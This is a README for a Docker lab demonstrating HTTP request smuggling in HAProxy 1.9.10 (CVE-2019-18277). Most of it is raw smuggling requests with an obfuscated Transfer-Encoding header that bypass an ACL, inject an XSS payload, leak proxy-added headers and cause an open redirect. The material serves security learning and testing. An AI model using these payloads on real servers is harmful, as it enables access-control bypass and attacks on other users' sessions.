# Lab HAProxy HTTP request smuggling - CVE-2019-18277

### Info

There are HTTP Smuggling CL.TE(TE.TE) issues in HAProxy < 2.0.6

Threr are three flags
* Using HTTP method GPOST to /
* Try to access /flag. You need bypass ACL
* Try to get your reqeust header

### Composition
* ReverseProxy: HAProxy 1.9.10
* Backend: Gunicorn 20.0.0

### Usage

Run 
``` bash
chmod +x src/haproxy
docker-compose up
```

Go http://127.0.0.1:10081/

### Testing

Run
```
./check.sh
```

You will get two flag

### HTTP Requests
If it's not success, try to send the request one more time.
Replace [\x0b] with 0b byte. Enter %0b and URL decode it.

##### Use GPOST verb
```
POST / HTTP/1.1
Content-Length: 6
Transfer-Encoding:[\x0b]chunked

0

G
```

##### Bypass ACL to access /flag
```
POST / HTTP/1.1
Content-Length: 28
Transfer-Encoding:[\x0b]]chunked

0

GET /flag HTTP/1.1
a: 
```

##### XSS
Use Burp to send request, then open browser to http://127.0.0.1:10081
If the browser doesn't alert(1), try it one more time
```
POST / HTTP/1.1
Content-Length: 128
Transfer-Encoding:[\x0b]chunked

0

POST /echo HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 32

msg=<script>alert(1)</script>//
```

##### Get headers added by proxy
```
POST / HTTP/1.1
Content-Length: 102
Transfer-Encoding:[\x0b]chunked

0

POST /echo HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 105

msg=
```


#### Open Redirect
Use Burp to send request, then open browser to go htpp://127.0.0.1:10081/
If the browser doesn't redirect to ww.google.com, try it one more time
```
POST / HTTP/1.1
Content-Length: 63
Transfer-Encoding:[\x0b]]chunked

0

POST /redirect HTTP/1.1
Host: www.google.com/?a=
a: asdf
```





### Reference:
* https://nathandavison.com/blog/haproxy-http-request-smuggling



